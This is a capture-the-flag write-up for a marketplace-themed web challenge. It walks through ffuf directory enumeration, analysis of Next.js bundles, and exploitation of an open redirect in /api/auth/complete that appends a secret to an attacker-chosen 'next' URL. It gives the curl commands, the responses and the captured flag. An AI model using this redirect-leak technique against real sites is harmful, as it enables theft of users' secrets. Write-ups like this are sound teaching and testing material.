
### Description

> The login desk is happy to send buyers back where they came from.  
> If the return address is trusted too much, something extra may tag along.

---

# Initial Recon

The challenge homepage contained a marketplace-themed website.

![Challenge Homepage](Images/Pasted%20image%2020260620011954.png)


Directory enumeration revealed several interesting endpoints:

```bash
ffuf -u http://159.89.230.27/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-fs 0
```

Results:

```text
/admin
/auth
/dashboard
/settings
/vendor
/vendor-application
```

Notable observations:

- `/admin` redirected to `/admin/login`
    
- `/dashboard` redirected to `/auth`
    
- `/settings` redirected to `/auth`
    
- `/vendor` returned HTTP 500
    

---

# Investigating Admin Login

Accessing:

```text
/admin/login
```

displayed an administrator login page.

The JavaScript bundle for the page was downloaded and analyzed:

```bash
curl -s \
http://159.89.230.27/_next/static/chunks/app/admin/login/page-5afb8340d2ce145f.js \
-o admin.js
```

Inspection showed that the login form was completely fake:

```javascript
let submit = async (e) => {
    e.preventDefault();
    setError("");
    setLoading(true);
    setError("Invalid credentials");
    setLoading(false);
}
```

No API requests were made.

This indicated that the admin portal was a decoy.

---

# Investigating the Authentication Flow

The challenge description strongly suggested a return URL vulnerability.

The JavaScript bundle used by `/auth` was downloaded:

```bash
curl -s \
http://159.89.230.27/_next/static/chunks/app/auth/page-9ddd8f18489117b9.js \
-o auth.js
```

Searching the bundle revealed the following code:

```javascript
if (a.success) {
    let next = new URLSearchParams(window.location.search).get("next");

    setTimeout(() => {
        if (next) {
            window.location.href =
                "/api/auth/complete?next=" +
                encodeURIComponent(next);
            return;
        }

        window.location.href = "/dashboard";
    }, 100);
}
```

Important findings:

1. The application reads a user-controlled parameter:
    

```text
next
```

2. The parameter is forwarded to:
    

```text
/api/auth/complete?next=<value>
```

3. This matched the challenge description regarding a trusted return address.
    

---

# Creating an Account

Registration endpoint:

```http
POST /api/auth/register
```

Request:

```http
POST /api/auth/register
Content-Type: application/json

{
  "email": "test@test.com",
  "password": "Password123!"
}
```

Response:

```json
{
  "success": true,
  "token": "<jwt>",
  "user": {
    "id": "9m346i",
    "email": "test@test.com",
    "isVendor": false
  }
}
```

A cookie named:

```text
auth-token
```

was issued.

---

# Testing the Redirect Endpoint

Without authentication:

```bash
curl -i \
"http://159.89.230.27/api/auth/complete?next=https://example.com"
```

Response:

```http
HTTP/1.1 307 Temporary Redirect
Location: http://0.0.0.0:3000/auth
```

This showed that unauthenticated users were redirected back to the login page.

---

# Exploiting the Vulnerability

Using the valid authentication cookie:

```bash
curl -i \
-b 'auth-token=<VALID_JWT>' \
"http://159.89.230.27/api/auth/complete?next=https://example.com"
```

Response:

```http
HTTP/1.1 307 Temporary Redirect
Location: https://example.com/?handoff=bitflag%7Btru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts%7D
```

Decoding the URL:

```text
https://example.com/?handoff=bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}
```

The application trusted the attacker-controlled `next` parameter and appended sensitive information before redirecting.

---

# Root Cause

The application implemented a login redirection flow:

```text
/auth?next=<destination>
        |
        v
/api/auth/complete?next=<destination>
        |
        v
redirect(destination)
```

The destination URL was not properly validated.

As a result:

- Users could be redirected to arbitrary domains.
    
- Sensitive information was included in the redirect.
    
- An attacker-controlled destination could receive secrets.
    

This is a classic **Open Redirect leading to Information Disclosure**.

---

# Flag

```text
bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}
```

---
